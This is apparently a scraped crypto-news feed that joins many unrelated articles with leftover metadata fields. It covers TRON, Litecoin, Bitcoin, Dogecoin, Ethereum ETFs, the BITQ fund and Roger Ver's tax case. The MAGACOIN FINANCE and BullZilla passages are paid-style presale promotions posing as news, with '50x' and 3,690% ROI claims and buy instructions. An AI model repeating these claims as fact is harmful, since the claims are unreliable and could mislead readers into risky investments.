Tron historic price sentiment TRON price history Tron, founded by Justin Sun in 2017, raised $70 million through an ICO the same year; it launched its mainnet in May 2018 and migrated TRX from Ethereum to Tron in June, which temporarily boosted TRX’s price to $0.09. TRX reached an all-time high of $0.3004 in January 2018 before dropping below $0.05 a month later; it consistently traded under $0.05 until late 2020, when it began to rise again. In 2021, it reached a high of $0.16. Tron was also reorganized as a DAO as Justin stepped down as CEO of Tron Foundation. TRX was in a bear trend for the best part of 2022. In 2023, TRX maintained a consistent bull run, rising from a low of $0.05. In March 2023, the SEC sued Justin for allegedly selling unregistered securities and promoting Tron and Bittorent tokens. In February 2024, Circle’s announcement to cease USDC on Tron led TRX to correct from $0.1429. TRX held above $0.1234 until mid-May, then dropped to $0.1113. The price rebounded to $0.1398 in July but fell again to $0.1213 in early August. By late September, TRX recovered to $0.166, reaching $0.1691 in October and touching $0.2130 in late November. TRX ended 2024 with a price tag of $0.255. Tron was priced at $0.255 at the start of January 2025 and it was trading in a range of $0.204 to $0.257 in February. In March 2025, Tron (TRX) dipped to $0.212, but it recovered to the $0.23 range in April and $0.278 in May, while it observed its yearly high price of $0.370 on August 14. At the start of October, Tron is trending near the $0.34 range, maintaining its price above $0.31, as the current Tron sentiment is neutral.",Crypto Price Predictions|TRON,EN,0,0,MARKET|BLOCKCHAIN|BUSINESS|TRADING|TRX|ICO|ALTCOIN|EXCHANGE|BNB|RESEARCH|LINK|ASIA|USDT|USDD|REGULATION|CRYPTOCURRENCY,"{'name': 'Cryptopolitan', 'img': 'https://images.cryptocompare.com/news/default/cryptopolitan.png', 'lang': 'EN'}",cryptopolitan,2025-10-10 02:24:00

However, traders now say the next move could be decisive – determining whether Litecoin breaks out toward recovery or slips back into a deeper consolidation phase. The coin’s inability to breach $135, a resistance zone that has capped rallies since 2023, remains the key obstacle. Market analyst Ali Martinez noted that a decisive close above this threshold could trigger a broader upward trend, while failure could send LTC revisiting the $50 region, an area historically associated with accumulation during bear phases. Despite volatility, projections remain cautiously optimistic: analysts see Litecoin stabilizing around $133 by the end of October if current sentiment holds. As attention turns toward regulatory milestones and potential ETF approvals, many investors are also rotating into high-growth opportunities – and one project continues to dominate those conversations. MAGACOIN FINANCE, already hailed as one of 2025’s most successful altcoins, is attracting investors eager to capture explosive upside during the next altcoin season. ETF Approval Nears for Litecoin Momentum surrounding the much-anticipated Litecoin ETF has been building rapidly. Canary Capital recently filed an S-1 amendment for its proposed Litecoin (LTCC) and Hedera (HBAR) spot ETFs, detailing a 95-basis-point fee structure. Analysts see this as one of the final procedural steps before formal approval. According to Bloomberg’s Eric Balchunas, the filing appears “nearly complete,” though the recent U.S. government shutdown could slightly delay the decision. Still, sentiment across financial markets remains overwhelmingly positive. Prediction platform Polymarket currently shows 98% odds that regulators will approve the fund, reflecting strong institutional confidence in the upcoming launch. A green light from the SEC could transform Litecoin’s near-term outlook, drawing in fresh inflows and boosting its market visibility. At the same time, analysts warn that rejection could trigger a sharp correction, potentially testing the $100 support zone. The coming weeks are likely to determine whether LTC cements its recovery or faces another retracement before year-end. Market Confidence Builds Ahead of Broader ETF Decisions Litecoin’s ETF progress is part of a much larger wave sweeping through the crypto market. Several other spot ETF applications – including those tied to XRP, Solana (SOL), and Dogecoin (DOGE) – are expected to receive final decisions in the coming weeks. Institutional demand for diversified crypto exposure is at an all-time high, with funds competing to provide access to a broader range of assets beyond Bitcoin and Ethereum. This surge in ETF interest has sparked hopes of a new wave of adoption. Analysts believe that once the next round of approvals arrives, liquidity will spread across the altcoin sector, potentially igniting one of the strongest rallies since 2021. MAGACOIN FINANCE: Investors Prepare for a 50x Altcoin Season As capital begins to flow back into the crypto market, MAGACOIN FINANCE is emerging as one of the most promising altcoins of 2025, capturing investor attention with its remarkable performance and expansion. The project’s sustained growth and rising community engagement have placed it in a league of its own, with experts predicting returns of up to 50x for early participants as the bull market accelerates. Unlike typical presale tokens, MAGACOIN FINANCE has focused on ecosystem building, sustainable tokenomics, and community-driven initiatives, enabling it to outperform many of its peers even before major exchange listings. Its reputation as a fast-rising project has made it a focal point across crypto forums and social media, where retail and institutional investors alike are calling it one of the top early-stage opportunities of the year. This momentum has led analysts to draw parallels between MAGACOIN FINANCE’s current trajectory and the breakout runs of major altcoins during past bull markets. With the next altcoin cycle fast approaching, the project’s strong fundamentals and rapidly growing holder base could make it one of the standout success stories of 2025. Outlook: Litecoin Faces a Defining Moment Litecoin’s future now hinges on what happens next. A confirmed ETF approval and breakout above $135 could restore confidence and trigger a significant move higher. Conversely, a setback or delay could send the asset into another period of sideways trading. Either way, investors are preparing for volatility – and opportunity. With ETF approvals expanding across the crypto landscape and liquidity starting to rotate into emerging assets, this could be the beginning of a renewed altcoin rally. For many, MAGACOIN FINANCE represents the next big winner of this cycle – a project combining market momentum, investor enthusiasm, and long-term growth potential at a scale few others can match.

The leading cryptocurrency continues to trade just below its all-time high near $126,000, with bulls and bears now locked in a battle to determine the next major move. Some analysts believe Bitcoin is preparing to break through resistance and enter price discovery, targeting new record highs. Others, however, warn of a potential short-term correction, arguing that market euphoria may have reached unsustainable levels. According to onchain data, long-term holders have started taking profits, a behavior often seen during key inflection points in the market. While this wave of distribution has not yet reached extreme levels, it does highlight a gradual transfer of coins from seasoned investors to newer participants — a dynamic that can precede increased volatility. Despite this selling activity, the broader market structure remains intact, with institutional demand and ETF inflows continuing to provide support. As the week unfolds, Bitcoin’s ability to hold above the $120,000 support zone will be crucial. A decisive move in either direction could set the tone for the next major trend , shaping sentiment across the entire crypto market. Long-Term Holders Selling Momentum Builds Top analyst Axel Adler shared key onchain data showing that Long-Term Holders (LTHs) have sold 295,000 BTC over the past 30 days, averaging around 9,800 BTC per day. While this level of selling represents elevated activity, Adler points out that it is not extreme compared to the distribution peaks seen in May and December 2024, when over 800,000 BTC were sold. Historically, such selling phases have accompanied profit-taking events during major bullish runs — not necessarily signaling the end of a cycle, but rather a rotation of supply between experienced holders and new market participants. Adler explains that this flow remains compatible with a bullish market structure, provided that demand continues to absorb the coins being sold. Current data supports this view: inflows from institutional investors and ETF-related buying are offsetting much of the selling pressure. This balance suggests that while LTHs are realizing gains, the market remains structurally healthy, with strong demand sustaining prices above key support zones. The coming days could prove decisive for Bitcoin’s direction. Many analysts are watching whether BTC can reclaim the $125,000 resistance and push into price discovery territory. If buying momentum holds and the distribution remains well absorbed, Bitcoin could be gearing up for its next expansive move — one that could define the next phase of this cycle and set new all-time highs. However, failure to maintain current levels could trigger a temporary cooling phase before the broader trend resumes. Key Support Around $120K Holds Firm Bitcoin is currently trading near $121,975, consolidating after a volatile week marked by sharp movements above and below the $122,000 level. The 4-hour chart shows that BTC remains in a short-term corrective phase following its rejection near the $126,000 all-time high, but the broader structure continues to favor the bulls as long as price holds above $120,000. The 50-period moving average (blue line) is now acting as immediate support, providing a potential rebound zone if buying pressure returns. Below that, the 117,500 level — highlighted as a major horizontal support — remains the key level to watch. A breakdown below this point could open the door to deeper retracements toward $114,000, where the 200-period moving average lies. On the upside, Bitcoin needs to reclaim $123,000–$124,000 with strong volume to confirm renewed bullish momentum. A breakout above $125,000 would likely invalidate the correction and signal the start of a new leg toward price discovery. BTC is consolidating within a healthy range after a strong rally. As long as buyers continue defending the current support area, the market structure remains bullish — setting the stage for another potential push toward new all-time highs in the coming sessions.

Is It Too Late To Buy Dogecoin? IncomeSharks’ daily chart frames the current advance as a rising channel that has been in place since early summer. Price is riding a sequence of higher lows off the June base and is now near $0.26, mid-channel, with the lower trendline rising through roughly $0.24 and the upper boundary capping rallies in the $0.33 area. The analyst’s “squiggle” path predicted a shallow pullback to the midline followed by a drive toward the channel top, an outlook backed by an On-Balance Volume line that continues to stair-step higher along its own rising trend. In this read, $0.24 is the pivotal dynamic support; losing it would hand control back to sellers and force a reassessment of the entire channel, while holds above $0.26 reopen a test of the $0.33 line that has repeatedly capped advances. Related Reading: The Historical Performance That Says Dogecoin Price Will Hit $11.71 By End Of Year Cantonese Cat’s daily view focuses on market structure rather than indicators. The chart traces a long, clean downtrend line from last year’s lower-high sequence—connecting the $0.48 peak through multiple failure points—now broken and back-tested. Spot is fluctuating around $0.25–$0.26 after reclaiming that diagonal, which turns prior resistance into support. “It’ll never make sense to me why people kept saying that the cycle’s over and $DOGE is done when it’s making higher lows,” the trader writes, pointing to the serial HLs that have persisted since spring. If that staircase holds, the path of least resistance runs toward the prior local highs near $0.31, where supply rejected price in September; acceptance above that shelf would align with IncomeSharks’ channel targets. DOGE Vs. BTC The third lens is relative performance. Degentrading highlights DOGE/BTC as their “highest conviction trade,” adding color on why: “$doge has liquidity (so in the event I’m wrong, I don’t get raped on the way out). IF we get a breakout in BTC, Doge has historically performed extremely well. Out of all the dino coins, it is one that is also most familiar w tradfi. Seasonally, Oct is the month with the best median and decent mean returns for $doge… only negative year was in 2018.” Related Reading: Dogecoin Faces Two-Month Deadline Before $2 Explosion, Says Analyst The monthly DOGE/BTC chart shows price near 0.00000204 BTC, wedged between the 7-month moving average at ~0.00000187 BTC and the 25-month moving average at ~0.00000223 BTC. That places the pair at a decision point: sustained closes above the longer MA would mark a momentum shift back toward bulls and clear the way to test stepped resistance levels printed on the chart around 0.00000231 BTC and then the mid-range clusters near 0.00000511–0.00000791 BTC, whereas rejection keeps the cross confined to its post-2024 base. The historical blow-off high on the panel—0.00001287 BTC—illustrates the headroom if a full relative rotation develops, but the moving-average shelf is the near-term arbiter. Across all three takes, the through-line is that Dogecoin has not broken its constructive pattern. The spot chart continues to respect a rising channel with improving OBV, the longer downtrend has been breached and retested with HLs intact, and the BTC pair sits one push below a higher-timeframe moving-average reclaim that would confirm relative strength. None of the analysts claim inevitability; each view anchors risk at visible levels. For spot traders, the rising lower boundary around $0.24 is the line that converts a healthy uptrend into distribution if lost; for relative-value traders, the 7-month average near 0.00000187 BTC plays the same role. As long as those floors hold, the evidence presented by IncomeSharks, Cantonese Cat, and Degentrading says it is not “too late,” but rather still about execution around the channel midline and the MA reclaim that would validate the next leg. At press time, DOGE traded at $0.248.

Despite a 35% year to date total return for spot ETH ETFs, ETHT is actually negative on the year due to rebalance decay. My technical view of Ethereum is one that shows imminent weakness, as support levels under $4,000 per coin may soon be tested. In that environment, ETHT will perform considerably poorly. I would avoid it. In early November, I upgraded Ethereum ( ETH-USD ) to a 'strong buy' based on a fundamental setup that showed strong network activity growth and a favorable valuation relative to peers. I'm personally still long ETH and a couple of ETH proxies. Data by YCharts However, after more than doubling since the April lows, I think it's important to acknowledge some technical and broader market signals that should give a trader considering a leverage-based Ethereum strategy some pause. ProShares Ultra Ethereum ETF The ProShares Ultra Ethereum ETF ( ETHT ) is a 2x leveraged fund that has seen its AUM nearly triple year to date. Like other 2x leveraged products that I've covered for Seeking Alpha in the past, ETHT is inherently more volatile than a traditional ETF because it introduces leverage to its management strategy. This is not a security that should be passively held. It is for active traders who take tactical positions for short periods of time. As a 2x fund, ETHT is designed to mimic the returns of Ethereum each day. So if ETH increases by 3% in a single session, ETHT should produce a 6% return that same day. Inception: 6/6/24 AUM: $774 million Expense Ratio: 0.94% Dividend yield TTM: 1.54% This is not the only fund that offers 2x leverage to ETH. However, it is the one with the lowest expense ratio and the highest dividend yield of the three that I came across. But again, when considering 2x leveraged funds the expense ratio and dividend yield matter much less than they do for traditional ETFs due to the fact that 2x funds are not designed for long term holding. ProShares makes this point quite clear in its own disclaimer on the ETHT page: For any holding period other than a day, your return may be higher or lower than the Daily Target. These differences may be significant . Smaller index gains/losses and higher index volatility contribute to returns worse than the Daily Target. Larger index gains/losses and lower index volatility contribute to returns better than the Daily Target. To further illustrate the point that funds like ETHT are not designed for long term holding, here's the performance of ETHT against a peer fund and a spot fund year to date: Data by YCharts Despite a 35% year-to-date total return for the iShares Ethereum Trust ETF ( ETHA ), ETHT and the Volatility Shares 2x Ether ETF ( ETHU ) are both actually negative year-to-date. Thus, timing entries and exits is critical. And judging by my own personal view of both Ethereum's technicals and broader market concerns, I think now would be a particularly bad time to jump into an ETHT position. Bitcoin's Fresh High and ETH Resistance Zones TrendSpider Amid growing interest in what has been dubbed the 'debasement trade' following Gold's ( XAUUSD:CUR ) monster rally in 2025, Bitcoin ( BTC-USD ) reached yet another new all time high after briefly trading above $126k per coin in early October. This was a relatively small nominal new high from the August peak of $124k per coin, and the price action since has actually favored those who sold the high. Bitcoin is now right back in the chop range that it briefly broke out of a short time ago. As Bitcoin goes, so too goes most of the Digital Asset market and Ethereum is no different. TrendSpider In fact, Ethereum had already peaked from a marginal new nominal high in late-August and has since failed two additional attempts to stay above resistance in the $4,700-4,800 range. The other indication in the chart above that would give me pause if I were considering an ETHT position today is just how much lower the 200 day MA is than the 50. The fact that the 200 day MA is about 28% below current levels goes to show just how large Ethereum's summer rally has been. Even if Ethereum simply consolidates above $4,000 per coin and doesn't retest sub-$4,000 support zones, chop is the last thing an ETHT holder would want because it would erode the position through rebalance decay without giving the clear directional sell signal that might help the trader cut out of the position earlier. TrendSpider Looking at the weekly chart, it's not all that difficult to see a scenario where ETH trades under $4,000 per coin again. The 20 week MA is currently at just under $3,700 - and this is a level that would be consistent with a resistance-turned-support test going back to 2024. Furthermore, weekly RSI-14 hit 74 (overbought) in August right as the coin was making a new nominal high. At minimum, I would expect ETH to back-test the 20 week MA (currently $3,662) but I could even see the coin pull all the way back to the 50-week MA in a bigger market selloff. That would bring ETH down closer to $3,000 per coin and absolutely hammer an ETHT position held during that draw-down. Risks I have to again mention that any 2x ETF is highly risky due to volatility, leverage, and long term decay. These are not products that are meant for long term holding or for use by novice traders. Once a trader earns some stripes through experience, I don't think there is anything wrong with using 2x ETFs for short-term tactical moves, and I've actually used them a handful of times in the past; sometimes very successfully and other times much less so. The key to using these types of products is having a plan, having tolerance for risk, and knowing when you're wrong. I could certainly be wrong in calling ETHT a 'sell' with this initial coverage article. It's entirely possible that ETH rebounds from here and makes a more meaningful new high in the weeks and months ahead. In that instance, ETHT will likely perform quite well. Summary Broadly speaking, I think the price action these last few weeks has been telling. From where I sit, the lack of follow through for both Bitcoin and Ethereum when making new nominal highs should give traders some pause before jumping into a leveraged long ETF like ETHT. I think traders should wait for a proper breakout in ETH to be confirmed before using ETHT for a tactical long. So far, we don't have that breakout confirmation. If anything, I think we have the recipe for a drawdown in ETH over the coming weeks and months. ETH is in no man's land right now. It's chopping around between support and resistance levels. That's a bad place to make a 2x ETF wager, in my view.",ETH-USD|ETHT,EN,0,0,CRYPTOCURRENCY|ETH|MARKET|TRADING|BTC,"{'name': 'Seeking Alpha', 'img': 'https://images.cryptocompare.com/news/default/seekingalpha.png', 'lang': 'EN'}",seekingalpha,2025-10-10 03:01:49

ETH is now moving lower and might extend losses below $4,250 in the short term. Ethereum started a downside correction below $4,550 and $4,500. The price is trading below $4,450 and the 100-hourly Simple Moving Average. There is a key bearish trend line forming with resistance at $4,385 on the hourly chart of ETH/USD (data feed via Kraken). The pair could continue to move down if it trades below $4,250. Ethereum Price Dips Further Ethereum price failed to stay above $4,550 and started a fresh decline, like Bitcoin . ETH price dipped below the $4,500 and $4,450 levels to enter a bearish zone. The price tested the $4,270 zone. A low was formed at $4,270 and the price is now consolidating losses. There was a minor recovery wave toward the 23.6% Fib retracement level of the recent decline from the $4,760 swing high to the $4,270 low. However, the bears are active near the $4,380 level. Besides, there is a key bearish trend line forming with resistance at $4,385 on the hourly chart of ETH/USD. Ethereum price is now trading below $4,450 and the 100-hourly Simple Moving Average . On the upside, the price could face resistance near the $4,385 level and the trend line. The next key resistance is near the $4,450 level. The first major resistance is near the $4,510 level or the 50% Fib retracement level of the recent decline from the $4,760 swing high to the $4,270 low. A clear move above the $4,510 resistance might send the price toward the $4,570 resistance. An upside break above the $4,570 region might call for more gains in the coming sessions. In the stated case, Ether could rise toward the $4,640 resistance zone or even $4,720 in the near term. More Losses In ETH? If Ethereum fails to clear the $4,450 resistance, it could start a fresh decline. Initial support on the downside is near the $4,320 level. The first major support sits near the $4,270 zone. A clear move below the $4,270 support might push the price toward the $4,250 support. Any more losses might send the price toward the $4,150 region in the near term. The next key support sits at $4,120. Technical Indicators Hourly MACD – The MACD for ETH/USD is gaining momentum in the bearish zone. Hourly RSI – The RSI for ETH/USD is now below the 50 zone.

BITQ's holdings are predominantly mid-cap companies, with top names like IREN, MARA, and RIOT, many showing volatile earnings and high P/E ratios. The ETF is highly cyclical, with extreme drawdowns in risk-off years and outsized gains in risk-on periods, making it unsuitable for buy-and-hold strategies. BITQ is rated 'Buy' for momentum into year-end 2025, but investors should time entry and exit carefully due to its high volatility. Thesis Similar to gold miners rallying in 2025, bitcoin miners are having an astounding year as the currency rallies. Bitwise Crypto Industry Innovators ETF ( BITQ ) is an equities exchange-traded fund that provides focused exposure to the crypto economy without the complications of holding crypto assets outright. The ETF holds a mix of crypto miners, crypto trading platforms, asset management platforms, and infrastructure companies. The ETF is market weighted and contains 30 names. As per its fact sheet, most of its holdings are mid-cap companies, which make up 56% of the holdings. Large-caps are 25%, while mega-caps represent 16%. The article will explore some of the holdings in detail, and outline why this ETF is a good momentum play given its very high beta and cyclical nature. Composition - only equities, no outright cryptocurrencies The fund segregates its holdings in larger sub-sectors: Mining: 37% Trading & Custody: 35% Treasury Holdings: 15% Asset management: 7.5% Infrastructure: 5.5% Let us have a look at the top names in the ETF: Top 10 Holdings (Fund Website) The top ten names make up over 63% of the fund, and they represent well-known names in the space. Let us have a closer look at some of them: 1) IREN Ltd ( IREN ): IREN is an Australia-based company that owns and operates data centers powered by 100% renewable energy for high-performance computing (HPC) applications. The company has positive earnings, a forward EPS of 0.98, and a 61x P/E ratio. The name trades at 8x book value, but its forward earnings projections are muddled as per Seeking Alpha (i.e. does not show a clear upwards trajectory). As per Seeking Alpha, the average price target as per Wall St analysts is $48 per share. 2) MARA Holdings ( MARA ): Mara is an American digital asset technology and cryptocurrency mining company. The name has several business segments: bitcoin mining, digital asset treasury, and energy and infrastructure. In terms of bitcoin mining, MARA operates specialized computers to validate transactions on the Bitcoin blockchain and earn Bitcoin. Thus the higher the price of Bitcoin, the higher the NAV for Mara. The treasury side involves holding strategic Bitcoin reserves for long term gains. The company has positive earnings, a forward EPS of 0.48, and a 41x P/E ratio. The name trades at 1.5x book value, and its forward earnings projections are also muddled with negative EPS projected for the future. The average price target as per Wall St analysts is $23 per share. 3) Riot Platforms ( RIOT ): Riot is a publicly traded, vertically integrated Bitcoin mining company and infrastructure platform. The name operates several business segments, including Bitcoin mining, treasury services, and an AI computing platform. The company has negative earnings estimates for both 2025 and 2026, although it has posted quarters of positive earnings in the past. Its operating income until 2024 has always been negative. The company trades at 2.4x book value, and the average price target per Wall St analysts is $21 per share. 4) Bitdeer Technologies Group ( BTDR ): Although not in the top 10, the fund does hold a 2% allocation to BTDR. Bitdeer is a global technology company focused on providing a comprehensive suite of computing solutions for the blockchain and high-performance computing industries. BTDR operates several segments, such as bitcoin mining, cloud hash rate, and infrastructure. The company has negative earnings estimates for 2025, but a 0.91 EPS estimate for 2026. Furthermore, EPS is seen doubling in 2027. The name trades at 6x book value, and the average Wall St. estimate is $25/share. A very cyclical ETF Let us start by looking at some of the fund's analytics: AUM: $0.5 billion Expense ratio: 0.85% St deviation (3Y): 67% Beta: 2.08 As we can see this name is not for the faint of heart, with a 67% standard deviation, and a drawdown profile that looks like this: Drawdown profile (PortfolioVisualizer) Yes, you are reading the above chart correctly, where you see the ETF with a -90% drawdown in late 2022. It has not yet recovered its entire drawdown since inception, but the performance this year has been spectacular, with the fund up +71%. The performance per year is as follows as per Morningstar: 2022: -83% 2023: +246% 2024: +47% YTD: +71% We can see the pattern here, with risk-off years having massive drawdowns, while risk-on years see substantial gains. This ETF is not a buy and hold in our view, but a cyclical play after a recession. We can also compare the ETF versus the bitcoin performance for the respective years: 2022: -64% 2023: +156% 2024: +121% YTD: +31% When we compare the two sets of data, we can see BITQ is a high-beta play on bitcoin, with larger drawdowns but also much larger positive recoveries. A momentum play into the year end As we have articulated above, BITQ is not a buy and hold, but a cyclical momentum play. Crypto has been very attractive in 2025 given deficit concerns in the U.S. and the dollar depreciation. A strong bitcoin has percolated into the crypto universe, with ample moves for the miners and infrastructure companies. BITQ is exhibiting strong momentum as per Seeking Alpha, with an A+ momentum grade and a 'Strong Buy' quant rating. The current government shutdown has also put upward momentum on crypto, with investors moving to an asset class that is not affected by bipartisan politics. We are of the opinion that the crypto universe will continue to deliver for the rest of 2025, with strong momentum and a high beta. However be careful with BITQ by picking an entry and exit point. This is not an ETF you want to hold long term. Our opinion is around strong momentum into December; thus, the penciled exit point is at the end of 2025. Conclusion BITQ is an equities ETF. The fund aggregates crypto miners, crypto trading platforms and crypto infrastructure companies. Many underlying holdings have negative EPS and very high P/E ratios, but are set to grow if bitcoin prices remain high. The fund is a high beta play on crypto prices and exhibits a high cyclicality. We like this ETF as a momentum play into the year end, but be mindful because BITQ is not a buy and hold by any means.",IREN|MARA|RIOT|BTDR|BITQ,EN,0,0,CRYPTOCURRENCY|BTC|MACROECONOMICS|TRADING|MINING,"{'name': 'Seeking Alpha', 'img': 'https://images.cryptocompare.com/news/default/seekingalpha.png', 'lang': 'EN'}",seekingalpha,2025-10-10 03:14:00
52922272,https://timestabloid.com/?p=85850,1760066105,https://resources.cryptocompare.com/news/67/default.png,"Dogecoin Climbs, Pepe Grows, and BullZilla’s $BZIL Presale Defines the Next Big Meme Coin Price Trend",https://timestabloid.com/dogecoin-climbs-pepe-grows-and-bullzillas-bzil-presale/,"Meme coin price action is dominating the crypto scene once again. After months of sideways trading, meme tokens are back in motion, fueling optimism across social media and exchanges. The market’s pulse has quickened, and retail investors are scanning for the next major breakout. Dogecoin’s price has jumped 3.22% over the last 24 hours to $0.2577, while Pepe gained 0.58% to reach $0.000009593. These shifts may appear small, but in a meme-coin landscape, they often mark the start of a larger cycle. Analysts suggest renewed whale activity and a recovery in retail sentiment could drive another wave of speculative momentum into late Q4 2025. Meanwhile, BullZilla ($BZIL) is building an entirely different kind of storm. Through its progressive presale design, every $100,000 raised, or 48 hours of silence, triggers an automatic price increase. As investors rush in, the clock itself becomes the catalyst, placing BullZilla among the top meme coin price movers of 2025. BullZilla ($BZIL): The Progressive Price Engine That’s Changing the Game BullZilla ($BZIL) is redefining what a meme-coin presale can be. Built on Ethereum, it merges storytelling and structure through a progressive price engine, a mechanism that increases the presale token price every time $100,000 is raised or every 48 hours pass. This system rewards early conviction and ensures the price never stagnates. Investors aren’t just buying a token; they’re participating in an evolving event where time and community engagement directly influence value. BullZilla’s presale is now in its 6th stage (Going Full Send), 1st phase, with a current price of $0.00013907. The project has raised over $850K, boasts 2,800+ holders, and has sold 30 billion tokens. At this level, the ROI reaches 3,690.47% toward the listing price of $0.00527, while early joiners still enjoy 2,318.60% gains. A $1,000 investment equals 7.19 million $BZIL, ahead of the next 4.79% price surge to $0.00014574 in Stage 6B, reinforcing BullZilla’s lead in the meme coin price race. At the current price of $0.00013907, a $1,000 investment buys around 7.19 million $BZIL tokens. If BullZilla lists at its projected final price of $0.00527, that allocation could reach $39,800, marking an approximate 3,690.47% ROI for Stage 6A participants and 2,318.60% ROI for early believers. The next 4.79% price surge to $0.00014574 in Stage 6B is imminent, making now a crucial moment for investors tracking the meme coin price rally and seeking maximum presale advantage. Investment Scenario: A $1,000 allocation at the current price could reach nearly $39,800 if $BZIL lists at $0.00527. Even a partial post-listing rally would yield multi-thousand-percent gains, excluding staking rewards. That growth potential is why analysts and traders increasingly rank the BullZilla ($BZIL) crypto presale among the most promising entries in today’s meme-coin market. How to Buy BullZilla Coins Set Up a Wallet: Install MetaMask or Trust Wallet. Buy Ethereum (ETH): Purchase ETH via Binance or Coinbase and send it to your wallet. Visit the Presale Site: Connect to the official BullZilla presale portal. Swap ETH for $BZIL: Enter your desired purchase amount, confirm, and your allocation will be locked until presale completion. Dogecoin: The Veteran Meme That Refuses to Fade Dogecoin remains the foundation of meme-coin culture. Up 3.22% to $0.2577, its latest surge followed subtle signals from Elon Musk’s X platform hinting at future DOGE payment integration. CoinDesk data shows daily trading volume climbing 19%, a sharp uptick that mirrors rising retail enthusiasm across Binance and Coinbase markets. From a charting perspective, Dogecoin is shaping a bullish pattern. The token is consolidating near the $0.26 level, a critical support that has held firm since late September. Analysts at CryptoQuant highlight a strengthening Relative Strength Index (RSI) and rising network activity, two indicators that typically precede a strong upward breakout. A move past $0.30 could quickly lift price targets toward $0.35. Still, traders remain cautious. A recent “death cross,” where the 50-day moving average slid below the 200-day line, suggests short-term consolidation may continue. Yet, over 60% of Dogecoin wallets haven’t sold a single token in six months, according to Glassnode. Long-term believers are holding tight, proving that DOGE’s power lies not in hype but in community conviction — and solidifying its influence on meme coin price trends. Pepe: Quiet Accumulation Behind the Meme Madness Pepe, the viral frog of the blockchain, has stabilized after months of turbulence. Up 0.58% in the last 24 hours to $0.000009593, it’s signaling renewed strength through quiet accumulation. Whale-tracking data from IntoTheBlock shows rising outflows from exchanges, meaning more large holders are moving tokens into private wallets — a classic precursor to a potential supply squeeze. Technically, Pepe trades within a healthy ascending channel. Support rests near $0.0000092, with key resistance around $0.0000114. Should buyers breach that ceiling, projections stretch toward $0.0000125 or even $0.00002 in an extended run. Cointelegraph reports that Pepe’s on-chain activity has increased by over 35% this week, reflecting early-stage optimism returning to the meme sector. But what makes Pepe interesting isn’t just its price action; it’s its durability. The project’s liquidity remains deep across major CEXs, and its community engagement has stayed strong despite market fatigue. This blend of infrastructure and grassroots loyalty positions Pepe as a quiet contender among meme coin price leaders heading into 2026. Conclusion BullZilla has emerged as one of the most powerful forces reshaping the meme coin price landscape in 2025. Its progressive price engine, 70% APY staking, and Roar Burn deflationary design create a self-sustaining cycle of scarcity and momentum. While Dogecoin anchors the legacy of meme coins and Pepe shows disciplined accumulation strength, BullZilla engineers its own growth through architecture, not hype. This unique blend of community-driven narrative and on-chain precision separates it from typical speculative projects. For investors tracking the best meme coin price surge, BullZilla offers a model of how presales should evolve, blending scarcity, storytelling, and exponential ROI potential. Its time-linked pricing ensures early believers always benefit, while staking and referral bonuses encourage sustained engagement. As Q4 approaches, BullZilla’s roaring presale momentum could define the next major chapter in meme coin evolution. Join the BullZilla presale today, secure your entry, and lock your place before the next price surge.

Dogecoin’s on-chain data shows bullish accumulation; Pepe demonstrates whale interest and sustained liquidity.

With over $840K raised and ROI potential near 3,900%, the BullZilla ($BZIL) crypto presale exemplifies how engineered conviction and scarcity can turn presales into high-ROI ecosystems.

The deal marks a turning point in a saga that has drawn political attention. It also reflects the shifting approach to crypto regulation under President Donald Trump. Ver, 46, rose to prominence in Bitcoin’s early years for his relentless evangelism. His efforts earned him the nickname “Bitcoin Jesus.” The New York Times reported Thursday that Ver has reached a tentative deferred-prosecution agreement with the US Department of Justice. The $48m deal marks the same amount prosecutors said he owed, in exchange for the eventual dismissal of charges if he complies with the agreement’s terms. In 2024, prosecutors charged him with fraud and tax evasion. They alleged he concealed digital asset holdings and failed to pay taxes after renouncing his US citizenship in 2014. The Justice Department has not yet filed the deal in court, and it could still change before being finalized. According to The New York Times, Roger Ver, known as “Bitcoin Jesus,” has agreed to pay $48 million under a deferred prosecution deal with the U.S. Department of Justice to settle a tax evasion case. He reportedly paid $600,000 to Trump ally Roger Stone and hired lawyers and… — Wu Blockchain (@WuBlockchain) October 9, 2025 Washington’s Stance on Crypto Softens Under Trump’s Second Term The case comes at a time of major change in Washington’s approach to crypto. Since Trump’s return to the White House, regulators have eased their stance. Earlier, enforcement had been far more aggressive under the previous administration. Now, lawsuits by the SEC against exchanges such as Coinbase have been dropped. In addition, several prominent crypto figures have received presidential pardons. Earlier this year, Trump pardoned Ross Ulbricht , founder of the Silk Road marketplace, who was serving a life sentence, and later extended clemency to the founders of BitMEX , who had pleaded guilty to violating anti–money laundering laws. ‘Bitcoin Jesus’ Turned to Trump Allies as Legal Pressures Mounted Ver has sought to align himself with Trump’s orbit throughout his legal troubles. Earlier this year, he paid $600,000 to Trump ally Roger Stone to lobby against the tax provisions central to his case. Lobbying records also show that Ver hired attorneys Christopher Kise and Brian Ballard, both of whom have long-standing ties to Trump’s political network. The Justice Department accused Ver of hiding the true value of his Bitcoin holdings. The filings were connected to his decision to renounce US citizenship. At that time, Americans were required to pay an “exit tax” on all global assets, including cryptocurrency. Prosecutors argued that by concealing his holdings, Ver deprived the US of millions in taxes. Ver Challenged Spain’s Approval of US Extradition Ver was arrested in Spain in 2024 following a US extradition request. He later filed a lawsuit with the European Court of Human Rights in Strasbourg, claiming Spain had violated his legal protections by approving the extradition to Los Angeles. In January, Ver said in a video posted online that he faced a possible sentence exceeding 100 years if convicted, framing his prosecution as politically motivated. In a message to Trump on X, he wrote, “Mr. President, I am an American, and I need your help. Only you, with your commitment to justice, can save me.” The settlement, if finalized, would close one of the most high-profile tax cases involving a cryptocurrency pioneer. For Ver, once celebrated for bringing Bitcoin to the mainstream, it marks a dramatic turn in a career defined by both innovation and controversy.

